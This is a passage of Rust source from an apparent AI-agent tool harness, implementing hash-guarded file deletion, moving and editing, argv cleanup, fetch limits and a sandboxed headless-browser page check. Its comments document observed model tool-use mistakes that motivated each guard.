            "refusing to delete a symlink; it may point outside the workspace".into(),
        ));
    }
    if metadata.is_dir() {
        if !recursive {
            return Err(ToolError::Denied(format!(
                "{} is a directory; pass recursive to remove it and everything in it",
                relative.display()
            )));
        }
        let entries = walk_workspace(&path)?.len();
        std::fs::remove_dir_all(&path)?;
        return Ok(PathChange {
            path: relative.display().to_string(),
            from: None,
            entries,
        });
    }
    let current = hash_bytes(std::fs::read(&path)?);
    match expected_hash {
        Some(expected) if hash_matches(&current, expected) => {}
        Some(_) => {
            return Err(ToolError::Denied(format!(
                "stale file hash; the file now hashes to {current}. Reread it before deleting."
            )));
        }
        // Named, not only required. Measured 2026-09-26 (Qwen3.6-35B-A3B): told
        // by the whole-file guard to delete and rewrite a script, the model
        // called delete_path without a hash twice and rewrote the file
        // unchanged in between -- "needs its current hash" gave it nothing to
        // send. The stale-hash refusal below already names it; so does this.
        None => {
            return Err(ToolError::Denied(format!(
                "deleting a file needs its current hash, as editing one does: {} hashes to \
                 {current} now. Send delete_path again with expected_hash {current} if you \
                 mean to remove it as it is.",
                relative.display()
            )));
        }
    }
    if let Some(approval) = edit_approval(relative) {
        policy.require(approval)?;
    }
    std::fs::remove_file(&path)?;
    Ok(PathChange {
        path: relative.display().to_string(),
        from: None,
        entries: 1,
    })
}

/// The file name of a program, however it was spelled: `/bin/sh` and `sh`
/// are the same program for the question of whether args repeat it.
fn program_name(executable: &str) -> String {
    Path::new(executable)
        .file_name()
        .map(|name| name.to_string_lossy().into_owned())
        .unwrap_or_else(|| executable.to_owned())
}

/// The args that follow the program, with a repeat of it taken off the front.
///
/// Shared by `run_command` and `start_service`: a service is started from
/// the same argv misunderstanding as often as a command is. Measured
/// 2026-09-26 (Qwen3.6-35B-A3B containerising a .NET API): four
/// `start_service` calls in a row as `/bin/sh` with args `["/bin/sh", "-c",
/// ...]`, each dying as "/bin/sh: /bin/sh: cannot execute binary file" --
/// the check compared `sh` with `/bin/sh` and never saw the repeat, and the
/// service path had no check at all.
pub fn args_after_program<'a>(
    executable: &str,
    args: &'a [String],
) -> Result<&'a [String], ToolError> {
    let program = program_name(executable);
    // The program by its name or by an absolute path to it. A relative path
    // with the same file name -- `node ./node`, `sh scripts/sh` -- is a file
    // the program is given, not the program again.
    let repeats = |arg: &str| {
        arg == executable
            || arg == program
            || (arg.starts_with('/') && program_name(arg) == program)
    };
    // The same argv misunderstanding with a launcher in front: `exec ls -la`
    // as the args of `ls`. Learned, measured on 2026-09-21, from one call
    // that worked -- `npm exec ng new site` -- and then applied to every
    // program: `ls exec ls -la dir` fails on `-la`, `find exec find ...` on
    // `find`, and `node exec node --version` looks for a script named `exec`.
    // A hundred actions lost to it in one session. When the word after
    // `exec` is the program itself, both are the prefix.
    let args: &[String] = match args {
        [launcher, repeated, rest @ ..]
            if launcher == "exec" && repeats(repeated) && !rest.is_empty() =>
        {
            rest
        }
        _ => args,
    };
    let args: &[String] = match args.first() {
        Some(first) if repeats(first) && args.len() > 1 => &args[1..],
        Some(first) if repeats(first) => {
            return Err(ToolError::Denied(format!(
                "args must not repeat the program: `{executable}` is already the executable, so \
                 args are what follows it, and `{program}` alone is not a command to run."
            )));
        }
        _ => args,
    };
    Ok(args)
}

/// A command as a person reads it: the program, then its args with any repeat
/// of the program taken off, as it will actually run.
pub fn command_line(executable: &str, args: &[String]) -> String {
    let args = args_after_program(executable, args).unwrap_or(args);
    std::iter::once(executable)
        .chain(args.iter().map(String::as_str))
        .collect::<Vec<_>>()
        .join(" ")
}

/// Moves or renames a path within the workspace.
///
/// Both ends are resolved against the root, so neither reaches outside it, and
/// an existing destination is refused rather than overwritten -- the same rule
/// `write_file` follows, and for the same reason: a blind overwrite should
/// never be one missing argument away.
pub fn move_path(policy: &ToolPolicy, from: &Path, to: &Path) -> Result<PathChange, ToolError> {
    policy.refuse_if_protected(from)?;
    policy.refuse_if_protected(to)?;
    let source = policy.resolve(from)?;
    let destination = policy.resolve(to)?;
    if !source.exists() {
        return Err(ToolError::Denied(format!(
            "{} does not exist",
            from.display()
        )));
    }
    if destination.exists() {
        return Err(ToolError::Denied(format!(
            "{} already exists; delete it first if replacing it is intended",
            to.display()
        )));
    }
    if let Some(approval) = edit_approval(from).or_else(|| edit_approval(to)) {
        policy.require(approval)?;
    }
    if let Some(parent) = destination.parent() {
        std::fs::create_dir_all(parent)?;
    }
    let entries = if source.is_dir() {
        walk_workspace(&source)?.len()
    } else {
        1
    };
    std::fs::rename(&source, &destination)?;
    Ok(PathChange {
        path: to.display().to_string(),
        from: Some(from.display().to_string()),
        entries,
    })
}

/// Words that open a definition, once visibility and `async` are stripped.
const DEFINITION_WORDS: [&str; 11] = [
    "class",
    "def",
    "fn",
    "impl",
    "struct",
    "enum",
    "trait",
    "mod",
    "func",
    "function",
    "interface",
];

fn opens_definition(line: &str) -> bool {
    let mut rest = line.trim_start();
    loop {
        let before = rest;
        for prefix in [
            "pub(crate) ",
            "pub(super) ",
            "pub ",
            "export ",
            "default ",
            "async ",
        ] {
            rest = rest.strip_prefix(prefix).unwrap_or(rest);
        }
        if rest == before {
            break;
        }
    }
    let word: String = rest
        .chars()
        .take_while(|c| c.is_ascii_alphanumeric() || *c == '_')
        .collect();
    DEFINITION_WORDS.contains(&word.as_str()) && rest[word.len()..].starts_with([' ', '<', '('])
}

fn indentation(line: &str) -> usize {
    line.chars()
        .take_while(|c| c.is_whitespace())
        .map(|c| if c == '\t' { 4 } else { 1 })
        .sum()
}

/// The definitions the zero-based line `index` sits inside, outermost first,
/// as `line 234: class Name(Base) > line 3764: def method(self)`.
///
/// Read from indentation and definition keywords, so it needs no parser and
/// works across languages that indent their bodies; it can be wrong where a
/// multi-line string drops to column 0. Seen 2026-09-18 (Part E, budget
/// variant, pyparsing-iadd): a run knew its test was at line 3,764 and spent
/// forty actions reading backwards to learn which class held it, to name the
/// test on a command line.
pub fn enclosing_definitions(lines: &[&str], index: usize) -> Option<String> {
    let here = lines.get(index)?;
    let mut limit = if here.trim().is_empty() {
        usize::MAX
    } else {
        indentation(here)
    };
    let mut found = Vec::new();
    for at in (0..index).rev() {
        if limit == 0 {
            break;
        }
        let line = lines[at];
        if line.trim().is_empty() {
            continue;
        }
        let indent = indentation(line);
        if indent < limit {
            if opens_definition(line) {
                let head: String = line.trim().chars().take(80).collect();
                let head = head.trim_end_matches(['{', ':', ' ']);
                found.push(format!("line {}: {head}", at + 1));
            }
            limit = indent;
        }
    }
    if found.is_empty() {
        return None;
    }
    found.reverse();
    Some(found.join(" > "))
}

/// Files up to this size are re-read to say which definitions a window starts in.
const WITHIN_READ_LIMIT: u64 = 4 * 1024 * 1024;

/// Files shorter than this may be rewritten to any length by `apply_replace`.
///
/// Was 40. Suite A4's first run (2026-09-19, `a4-expected-failures`) had a
/// model send a two-line fragment as the whole of a 25-line test file, which
/// the guard let through; the run recovered only through `restore_file`.
const SHRINK_GUARD_MIN_LINES: usize = 10;

/// Replaces text only when the caller supplies the current content hash, preventing stale edits.
pub fn apply_replace(
    policy: &ToolPolicy,
    relative: &Path,
    expected_hash: &str,
    replacement: &str,
) -> Result<ApplyResult, ToolError> {
    policy.refuse_if_protected(relative)?;
    if let Some(approval) = edit_approval(relative) {
        policy.require(approval)?;
    }
    let path = policy.resolve(relative)?;
    // A whole-file replacement of a file that is not there has one reading:
    // create it. Measured 2026-09-29 on gpt-oss-20b, which reached for
    // apply_replace to create two of its first files and was answered with a
    // bare "No such file or directory" each time.
    if !path.exists() {
        let mut created = write_file(policy, relative, replacement)?;
        created.normalized = Some(format!(
            "{} did not exist, so it was created with this content",
            relative.display()
        ));
        return Ok(created);
    }
    if std::fs::metadata(&path)?.len()
        > u64::try_from(policy.output_limit.saturating_mul(16)).unwrap_or(u64::MAX)
    {
        return Err(ToolError::Denied(
            "existing file exceeds the bounded edit size limit".into(),
        ));
    }
    let existing = std::fs::read(&path)?;
    if let Some(reason) = binary_reason(&existing) {
        return Err(deny_binary(relative, &reason, "edited"));
    }
    let mut normalized = None;
    let crlf_replacement;
    let replacement = match with_crlf(replacement) {
        Some(converted) if uses_crlf(&existing) => {
            normalized = Some(CRLF_NOTE.to_string());
            crlf_replacement = converted;
            crlf_replacement.as_str()
        }
        _ => replacement,
    };
    // Emptying a file is not editing it, and this tool is for editing. Measured
    // on the ornith-1.5:35b run of 2026-09-07: the fiftieth and last action of
    // the run replaced 11 KiB of working JavaScript with `""`, the budget ran
    // out immediately after, and the delivered site went from every block
    // visible to none. Nothing downstream saw it either -- the file still
    // existed, so the asset check stayed green. Removing a file is what
    // `delete_path` is for, and it is refusable, recorded and reversible in a
    // way this was not.
    if replacement.is_empty() && !existing.is_empty() {
        return Err(ToolError::Denied(format!(
            "refusing to replace the whole of {} with nothing. To remove the file use \
             delete_path; to change it, send the content it should have.",
            relative.display()
        )));
    }
    // A replacement that keeps less than half of a file of some size is far
    // more often a fragment meant for one place than a new version of the
    // file. Seen twice on 2026-09-18 (Part E on the engine): one method sent as
    // the whole of a 940-line file, a 49-line fragment as the whole of an
    // 800-line one; each run spent the rest of its budget on the wreck.
    let old_lines = String::from_utf8_lossy(&existing).lines().count();
    let new_lines = replacement.lines().count();
    if old_lines >= SHRINK_GUARD_MIN_LINES && new_lines.saturating_mul(2) < old_lines {
        return Err(ToolError::Denied(format!(
            "apply_replace replaces the whole file: {} has {old_lines} lines and this \
             replacement has {new_lines}, so {} lines would be deleted. To change part of the \
             file use replace_text with the exact lines to find. If the file really should \
             become this, delete_path it with expected_hash {} and write_file the new content.",
            relative.display(),
            old_lines - new_lines,
            hash_bytes(&existing)
        )));
    }
    let previous_hash = hash_bytes(&existing);
    if !hash_matches(&previous_hash, expected_hash) {
        return Err(ToolError::Denied(format!(
            "stale file hash; the file now hashes to {previous_hash}"
        )));
    }
    if replacement.len() > policy.output_limit {
        return Err(ToolError::Denied(
            "replacement exceeds policy size limit".into(),
        ));
    }
    // An edit that leaves the file as it was is not an edit, and reporting it
    // as one is what keeps a deployment from looking elsewhere. Measured on the
    // 80B building an Angular site: told the build was failing in three
    // components, it sent byte-identical content to each of them four times
    // over, was told "succeeded" every time, and reasonably concluded the fault
    // lay somewhere it had already ruled out. The hashes said so plainly --
    // expected and new were the same value -- and nothing looked at them.
    //
    // Refused rather than reported, because there is no case where writing a
    // file the content it already holds is the action the caller wanted.
    if replacement.as_bytes() == existing.as_slice() {
        return Err(ToolError::Denied(format!(
            "{} already contains exactly this content, so this edit would change nothing. \
             Whatever the checks are reporting has another cause: read the failure again and \
             look at the file it names.",
            relative.display()
        )));
    }
    atomic::write_atomic(
        &path,
        replacement.as_bytes(),
        atomic::Expect::Hash(&previous_hash),
    )?;
    let new_hash = hash_bytes(replacement.as_bytes());
    Ok(ApplyResult {
        path: relative.display().to_string(),
        normalized,
        previous_hash,
        expected_hash: new_hash.clone(),
        new_hash,
        warning: written_file_warning(policy, &path, relative, replacement),
        excerpt: changed_excerpt(&String::from_utf8_lossy(&existing), replacement),
    })
}

/// Replaces one exact occurrence of `find` with `replace`.
///
/// Whole-file replacement cannot reach a real repository: changing one line of
/// a two-thousand-line file would mean re-emitting the whole file, which is
/// impractical inside any context budget. This edits in place.
///
/// The match must be unique. Two occurrences mean the caller may not have
/// meant the one that would be changed, and guessing which is exactly the kind
/// of silent wrong edit the hash guard exists to prevent.
pub fn replace_text(
    policy: &ToolPolicy,
    relative: &Path,
    expected_hash: &str,
    find: &str,
    replace: &str,
) -> Result<ApplyResult, ToolError> {
    policy.refuse_if_protected(relative)?;
    if let Some(approval) = edit_approval(relative) {
        policy.require(approval)?;
    }
    if find.is_empty() {
        return Err(ToolError::Denied("find text is empty".into()));
    }
    let path = policy.resolve(relative)?;
    if !path.exists() {
        return Err(missing_file(relative, "edit"));
    }
    if std::fs::metadata(&path)?.len()
        > u64::try_from(policy.output_limit.saturating_mul(16)).unwrap_or(u64::MAX)
    {
        return Err(ToolError::Denied(
            "existing file exceeds the bounded edit size limit".into(),
        ));
    }
    let existing = std::fs::read(&path)?;
    if let Some(reason) = binary_reason(&existing) {
        return Err(deny_binary(relative, &reason, "edited"));
    }
    let previous_hash = hash_bytes(&existing);
    if !hash_matches(&previous_hash, expected_hash) {
        // The current hash is in hand, and withholding it makes the caller
        // spend a turn re-reading to learn something the refusal already knew.
        // Measured: three consecutive refusals of this kind in one run, each
        // costing an action the run did not have to spare.
        return Err(ToolError::Denied(format!(
            "stale file hash; the file now hashes to {previous_hash}"
        )));
    }
    let text = String::from_utf8_lossy(&existing).to_string();
    let mut normalized = None;
    let (crlf_find, crlf_replace);
    let (mut find, replace) =
        if uses_crlf(&existing) && (with_crlf(find).is_some() || with_crlf(replace).is_some()) {
            normalized = Some(CRLF_NOTE.to_string());
            crlf_find = with_crlf(find).unwrap_or_else(|| find.to_owned());
            crlf_replace = with_crlf(replace).unwrap_or_else(|| replace.to_owned());
            (crlf_find.as_str(), crlf_replace.as_str())
        } else {
            (find, replace)
        };
    let decoded = decoded_escapes(find);
    if !text.contains(find)
        && let Some(decoded) = decoded.as_deref()
        && text.matches(decoded).count() == 1
    {
        find = decoded;
        normalized = Some(
            "the `find` text carried its escapes literally, as `\\n` for a newline; it was \
             decoded and then matched exactly once"
                .to_string(),
        );
    }
    let loose;
    if !text.contains(find)
        && let Some(region) = loose_region(&text, find)
    {
        loose = region;
        find = loose.as_str();
        normalized = Some(LOOSE_NOTE.to_string());
    }
    let replace_trimmed;
    let replace = if normalized.as_deref() == Some(LOOSE_NOTE) {
        replace_trimmed = trimmed_find(replace).to_owned();
        replace_trimmed.as_str()
    } else {
        replace
    };
    let occurrences = text.matches(find).count();
    match occurrences {
        0 => {
            // "Not found" is true but unhelpful when the reason it is absent
            // is that this very edit already replaced it. Saying so is the
            // difference between a caller that moves on and one that retries
            // the same edit until its budget runs out. Measured: exactly that
            // loop, four times in one run, on a file already correctly fixed.
            if !replace.is_empty() && text.contains(replace) {
                return Err(ToolError::Denied(format!(
                    "this edit is already applied: the file does not contain the `find` text \
                     and does contain the `replace` text. The file now hashes to {previous_hash}"
                )));
            }
            return Err(ToolError::Denied(format!(
                "find text does not appear in the file. {}",
                where_it_diverges(&text, find)
            )));
        }
        1 => {}
        many => {
            return Err(ToolError::Denied(format!(
                "find text appears {many} times; include enough surrounding text to be unique"
            )));
        }
    }
    let updated = text.replacen(find, replace, 1);
    if updated.len() > policy.output_limit.saturating_mul(16) {
        return Err(ToolError::Denied("result exceeds policy size limit".into()));
    }
    // `find` equal to `replace` is a match that changes nothing, and the same
    // reasoning as in `apply_replace` applies: a caller told this succeeded
    // stops looking at the file that is actually wrong.
    if updated.as_bytes() == existing.as_slice() {
        return Err(ToolError::Denied(format!(
            "the `find` and `replace` texts are the same, so this edit would leave {} exactly \
             as it is. Whatever the checks are reporting has another cause.",
            relative.display()
        )));
    }
    atomic::write_atomic(
        &path,
        updated.as_bytes(),
        atomic::Expect::Hash(&previous_hash),
    )?;
    let new_hash = hash_bytes(updated.as_bytes());
    Ok(ApplyResult {
        path: relative.display().to_string(),
        normalized,
        previous_hash,
        expected_hash: new_hash.clone(),
        new_hash,
        warning: written_file_warning(policy, &path, relative, &updated),
        excerpt: changed_excerpt(&String::from_utf8_lossy(&existing), &updated),
    })
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FetchResult {
    pub url: String,
    pub status: u16,
    pub content: String,
    pub truncated: bool,
    pub redacted: bool,
    pub artifact_hash: String,
    /// The body's media type, as the server named it.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub content_type: Option<String>,
    /// Where the body was written, for a fetch with `save_as`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub saved_as: Option<String>,
    /// How many bytes the body was, when it was written or not shown.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub bytes: Option<u64>,
    /// SHA-256 of a saved body: what release pages publish to check against.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sha256: Option<String>,
    /// What the model should know about what it was and was not given.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub note: Option<String>,
}

/// The most of a fetched text put in front of the model.
///
/// Sixty-four KiB was the command limit reused. Measured 2026-09-26: the Go
/// download page and its JSON listing are hashes and file names, a few
/// characters per token, and each fetch added 15,000-45,000 tokens -- the
/// context doubled in one call and the next reply waited 108 seconds on
/// prefill. What is past this is one `save_as` away, searchable.
const FETCH_TEXT_BYTES: usize = 24 * 1024;
/// The most a download writes.
const FETCH_SAVE_BYTES: u64 = 4 * 1024 * 1024 * 1024;
/// How long a download may take, whatever the command timeout: a JDK is a few
/// hundred megabytes.
const FETCH_SAVE_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(30 * 60);

/// Whether a media type is text a model can read.
fn textual(content_type: &str) -> bool {
    let kind = content_type.to_ascii_lowercase();
    kind.starts_with("text/")
        || [
            "json",
            "xml",
            "javascript",
            "yaml",
            "toml",
            "csv",
            "markdown",
            "x-sh",
            "html",
        ]
        .iter()
        .any(|marker| kind.contains(marker))
}

/// Whether bytes with no usable media type are binary: a NUL, or more than a
/// few bytes that are not UTF-8, in the first of them.
fn looks_binary(bytes: &[u8]) -> bool {
    let head = &bytes[..bytes.len().min(8192)];
    if head.contains(&0) {
        return true;
    }
    let text = String::from_utf8_lossy(head);
    text.chars()
        .filter(|c| *c == char::REPLACEMENT_CHARACTER)
        .count()
        * 50
        > head.len().max(1)
}

/// Schemes a fetch may use. Anything else can reach the filesystem or a local
/// service without crossing the network the grant was given for.
const FETCH_SCHEMES: [&str; 2] = ["http", "https"];
/// Redirects a fetch follows, each re-checked against `FETCH_SCHEMES`.
const FETCH_REDIRECTS: usize = 5;

/// A screenshot of a page, stored where images for the model are kept.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LookResult {
    pub target: String,
    pub width: u32,
    pub height: u32,
    /// The image, under `.pwr/images/`, named by its SHA-256.
    pub image: PathBuf,
    pub bytes: u64,
    /// The HTTP status of the page itself, for a local server's URL: a 500
    /// is said even when the page drawn reads like content.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub status: Option<u16>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub title: Option<String>,
    /// The page's visible text once its scripts ran, bounded.
    #[serde(default)]
    pub text: String,
    /// What the page logged to its console, uncaught errors included, in
    /// order and bounded.
    #[serde(default)]
    pub console: Vec<String>,
}

/// The most visible text and console messages a page check returns.
const PAGE_TEXT_CHARS: usize = 4_000;
const PAGE_CONSOLE_MESSAGES: usize = 30;
const PAGE_CONSOLE_CHARS: usize = 600;

/// A page's console messages, from the browser's log (`--enable-logging`):
/// `[...:INFO:CONSOLE:3] "message", source: http://... (12)`. Chrome logs
/// every level the same way, uncaught exceptions and failed resource loads
/// included.
fn console_messages(log: &str) -> Vec<String> {
    log.lines()
        .filter(|line| line.contains(":CONSOLE"))
        .filter_map(|line| {
            let start = line.find("] \"")? + 3;
            let rest = &line[start..];
            let (message, source) = match rest.rfind("\", source: ") {
                Some(at) => (&rest[..at], rest[at + 11..].trim()),
                None => (rest.trim_end_matches('"'), ""),
            };
            let mut said: String = message.chars().take(PAGE_CONSOLE_CHARS).collect();
            if !source.is_empty() {
                said.push_str(&format!(" ({source})"));
            }
            Some(said)
        })
        .take(PAGE_CONSOLE_MESSAGES)
        .collect()
}

/// The text a person would read on a page, from its DOM after the scripts
/// ran: no scripts, styles or markup, entities decoded, blank runs folded.
/// And its title.
fn visible_text(dom: &str) -> (Option<String>, String) {
    // ASCII only, so every index into it is one into `dom`.
    let lower = dom.to_ascii_lowercase();
    let title = lower.find("<title").and_then(|open| {
        let start = open + lower[open..].find('>')? + 1;
        let end = start + lower[start..].find("</title")?;
        let title = decode_entities(dom[start..end].trim());
        (!title.is_empty()).then_some(title)
    });
    let mut text = String::new();
    let mut at = 0;
    while at < dom.len() {
        let Some(open) = lower[at..].find('<').map(|found| at + found) else {
            text.push_str(&dom[at..]);
            break;
        };
        text.push_str(&dom[at..open]);
        let skipped = ["script", "style", "noscript", "template", "head"]
            .iter()
            .find(|tag| {
                lower[open + 1..].starts_with(*tag)
                    && lower[open + 1 + tag.len()..]
                        .starts_with(|c: char| c == '>' || c.is_whitespace())
            });
        at = match skipped {
            Some(tag) => match lower[open..].find(&format!("</{tag}")) {
                Some(close) => {
                    let close = open + close;
                    close
                        + lower[close..]
                            .find('>')
                            .map_or(lower.len() - close, |end| end + 1)
                }
                None => dom.len(),
            },
            None => match lower[open..].find('>') {
                Some(end) => open + end + 1,
                None => dom.len(),
            },
        };
        text.push('\n');
    }
    let text = decode_entities(&text);
    let lines: Vec<String> = text
        .lines()
        .map(|line| line.split_whitespace().collect::<Vec<_>>().join(" "))
        .filter(|line| !line.is_empty())
        .collect();
    (title, lines.join("\n"))
}

fn decode_entities(text: &str) -> String {
    text.replace("&nbsp;", " ")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .replace("&#x27;", "'")
        .replace("&amp;", "&")
}

/// The browser `look_at` drives: `PWR_BROWSER`, else an installed Playwright
/// headless Chromium on macOS, then Chrome, Chromium or Edge and PATH.
pub fn browser_executable() -> Option<PathBuf> {
    if let Some(path) = std::env::var_os("PWR_BROWSER") {
        return Some(PathBuf::from(path));
    }
    #[cfg(target_os = "macos")]
    if let Some(home) = std::env::var_os("HOME")
        && let Some(browser) =
            playwright_headless_browser(&PathBuf::from(home).join("Library/Caches/ms-playwright"))
    {
        return Some(browser);
    }
    let known = [
        "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
        "/Applications/Google Chrome for Testing.app/Contents/MacOS/Google Chrome for Testing",
        "/Applications/Chromium.app/Contents/MacOS/Chromium",
        "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge",
    ];
    if let Some(path) = known.iter().map(PathBuf::from).find(|path| path.is_file()) {
        return Some(path);
    }
    let host = std::env::var_os("PATH")?;
    [
        "google-chrome",
        "chromium",
        "chromium-browser",
        "microsoft-edge",
    ]
    .iter()
    .find_map(|name| {
        std::env::split_paths(&host)
            .map(|directory| directory.join(name))
            .find(|candidate| candidate.is_file())
    })
}

/// Full Chrome's display initialization can fail in a confined macOS child.
/// Headless shell needs no desktop display or personal browser profile. Use
/// an existing installation only; never download a browser during a tool call.
#[cfg(target_os = "macos")]
fn playwright_headless_browser(cache: &Path) -> Option<PathBuf> {
    use std::os::unix::fs::PermissionsExt;
    let platform = if cfg!(target_arch = "aarch64") {
        "mac-arm64"
    } else {
        "mac-x64"
    };
    std::fs::read_dir(cache)
        .ok()?
        .flatten()
        .filter_map(|entry| {
            let revision = entry
                .file_name()
                .to_str()?
                .strip_prefix("chromium_headless_shell-")?
                .parse::<u32>()
                .ok()?;
            let binary = entry.path().join(format!(
                "chrome-headless-shell-{platform}/chrome-headless-shell"
            ));
            binary
                .metadata()
                .is_ok_and(|meta| meta.is_file() && meta.permissions().mode() & 0o111 != 0)
                .then_some((revision, binary))
        })
        .max_by_key(|(revision, _)| *revision)
        .map(|(_, binary)| binary)
}

/// The directory a browser's files live in: its `.app` bundle on macOS, its
/// own directory elsewhere.
fn browser_home(executable: &Path) -> PathBuf {
    // A PATH entry can be a symlink into an app bundle. Seatbelt checks the
    // resolved binary and its resources, not the spelling of that symlink.
    let resolved = executable
        .canonicalize()
        .unwrap_or_else(|_| executable.to_path_buf());
    let mut current = resolved.as_path();
    while let Some(parent) = current.parent() {
        if current
            .extension()
            .is_some_and(|extension| extension == "app")
        {
            return current.to_path_buf();
        }
        current = parent;
    }
    resolved.parent().map(Path::to_path_buf).unwrap_or_default()
}

/// Takes a screenshot of a page on this machine -- a local server, or an HTML
/// file in the workspace -- for a model that reads images.
///
/// The first rung of letting a model see what it built: a test suite says a
/// component renders, not that the layout is not broken. The browser runs
/// headless inside the same sandbox as a command -- its own bundle readable,
/// its profile in the workspace scratch, the network limited to this machine
/// -- and only a page here can be looked at, so nothing is fetched from
/// elsewhere on the model's behalf.
pub async fn look_at(
    policy: &ToolPolicy,
    target: &str,
    width: Option<u32>,
    height: Option<u32>,
) -> Result<LookResult, ToolError> {
    look_at_after(policy, target, width, height, &[]).await
}

/// One thing done on a page before it is looked at: a click on what a
/// selector or a visible text names, text typed into a field, or a key
/// pressed where the focus is. Exactly one of `click`, `type` and `press`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PageStep {
    /// A CSS selector, or the text of a button or link.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub click: Option<String>,
    /// The text to type; `into` says where.
    #[serde(default, rename = "type", skip_serializing_if = "Option::is_none")]
    pub type_text: Option<String>,
    /// The field to type into: a CSS selector, or its label, placeholder or
    /// name. The focused field when omitted.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub into: Option<String>,
    /// A key, by its DOM name: `Enter`, `Escape`, `Tab`...
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub press: Option<String>,
}

/// The most steps one look carries out.
pub const PAGE_STEPS: usize = 12;

/// The page a browser is opened on when there are steps to carry out: the
/// target in a frame that fills the window, and a script that waits for it,
/// does each step as a person's hands would -- a real click, a value set the
/// way typing sets it, with the events frameworks listen for -- and leaves,
/// for the text PWR reads back, what each step did and what the page then
/// shows. The browser has no profile, sees only this machine, and is closed
/// after the look; it is started without the same-origin rule so this page
/// can reach into the one it frames.
fn steps_page(url: &str, steps: &[PageStep]) -> String {
    let url = serde_json::to_string(url).unwrap_or_default();
    let steps = serde_json::to_string(steps).unwrap_or_default();
    format!(
        r#"<!doctype html><meta charset="utf-8"><title>PWR</title>
<style>html,body{{margin:0;height:100%}}iframe{{border:0;width:100%;height:100%;display:block}}</style>
<iframe id="page"></iframe><pre id="pwr-steps" hidden></pre><pre id="pwr-text" hidden></pre>
<script>
const steps = {steps};
const frame = document.getElementById('page');
const said = [];
const pause = (ms) => new Promise((done) => setTimeout(done, ms));
function find(doc, what, fields) {{
  try {{ const hit = doc.querySelector(what); if (hit) return hit; }} catch (_) {{}}
  const wanted = what.trim().toLowerCase();
  const pool = fields
    ? [...doc.querySelectorAll('input,textarea,select,[contenteditable="true"]')]
    : [...doc.querySelectorAll('button,a,[role="button"],input[type="submit"],input[type="button"],summary,label,[onclick]')];
  const names = (el) => [el.innerText, el.value, el.placeholder, el.name, el.id, el.getAttribute('aria-label'),
    ...(el.labels ? [...el.labels].map((label) => label.innerText) : [])]
    .filter(Boolean).map((text) => String(text).trim().toLowerCase());
  return pool.find((el) => names(el).includes(wanted)) || pool.find((el) => names(el).some((name) => name.includes(wanted)));
}}
function type(el, text) {{
  el.focus();
  if (el.isContentEditable) {{ el.textContent = text; }}
  else {{
    const proto = el instanceof frame.contentWindow.HTMLTextAreaElement ? frame.contentWindow.HTMLTextAreaElement.prototype
      : el instanceof frame.contentWindow.HTMLSelectElement ? frame.contentWindow.HTMLSelectElement.prototype
      : frame.contentWindow.HTMLInputElement.prototype;
    Object.getOwnPropertyDescriptor(proto, 'value').set.call(el, text);
  }}
  for (const name of ['input', 'change']) el.dispatchEvent(new frame.contentWindow.Event(name, {{ bubbles: true }}));
  el.blur(); el.focus();
}}
async function run() {{
  await new Promise((done) => {{ frame.addEventListener('load', done, {{ once: true }}); frame.src = {url}; }});
  await pause(600);
  for (const [index, step] of steps.entries()) {{
    const doc = frame.contentDocument, n = index + 1;
    try {{
      if (step.click != null) {{
        const el = find(doc, step.click, false);
        if (!el) {{ said.push(`step ${{n}}: nothing to click matches "${{step.click}}"`); continue; }}
        el.scrollIntoView({{ block: 'center' }}); el.click();
        said.push(`step ${{n}}: clicked "${{step.click}}"`);
      }} else if (step.type != null) {{
        const el = step.into != null ? find(doc, step.into, true) : doc.activeElement;
        if (!el || el === doc.body) {{ said.push(`step ${{n}}: no field matches "${{step.into ?? 'the focus'}}"`); continue; }}
        type(el, step.type);
        said.push(`step ${{n}}: typed into "${{step.into ?? 'the focused field'}}"`);
      }} else if (step.press != null) {{
        const el = doc.activeElement || doc.body;
        for (const name of ['keydown', 'keypress', 'keyup'])
          el.dispatchEvent(new frame.contentWindow.KeyboardEvent(name, {{ key: step.press, bubbles: true, cancelable: true }}));
        if (step.press === 'Enter' && el.form) el.form.requestSubmit ? el.form.requestSubmit() : el.form.submit();
        said.push(`step ${{n}}: pressed ${{step.press}}`);
      }} else {{ said.push(`step ${{n}}: names no click, type or press`); }}
    }} catch (error) {{ said.push(`step ${{n}} failed: ${{error && error.message}}`); }}
    await pause(450);
  }}
  await pause(300);
  const doc = frame.contentDocument;
  document.title = doc.title;
  document.getElementById('pwr-steps').textContent = said.join('\n');
  document.getElementById('pwr-text').textContent = doc.body ? doc.body.innerText : '';
}}
run().catch((error) => {{ document.getElementById('pwr-steps').textContent = 'the steps could not be carried out: ' + (error && error.message); }});
</script>"#
    )
}

/// [`look_at`], after carrying out `steps` on the page.
pub async fn look_at_after(
    policy: &ToolPolicy,
    target: &str,
    width: Option<u32>,
    height: Option<u32>,
    steps: &[PageStep],
) -> Result<LookResult, ToolError> {
    if steps.len() > PAGE_STEPS {
        return Err(ToolError::Denied(format!(
            "{} steps is more than one look carries out ({PAGE_STEPS}); do the first ones, look, and go on from what the page shows",
            steps.len()
        )));
    }
    if let Some(wrong) = steps.iter().position(|step| {
        [
            step.click.is_some(),
            step.type_text.is_some(),
            step.press.is_some(),
        ]
        .iter()
        .filter(|set| **set)
        .count()
            != 1
    }) {
        return Err(ToolError::Denied(format!(
            "step {} must have exactly one of `click`, `type` (with `into`) and `press`",
            wrong + 1
        )));
    }
    let width = width.unwrap_or(1280).clamp(320, 1920);
    let height = height.unwrap_or(800).clamp(240, 1600);
    let target = target.trim();
    let url = if target.starts_with("http://") || target.starts_with("https://") {
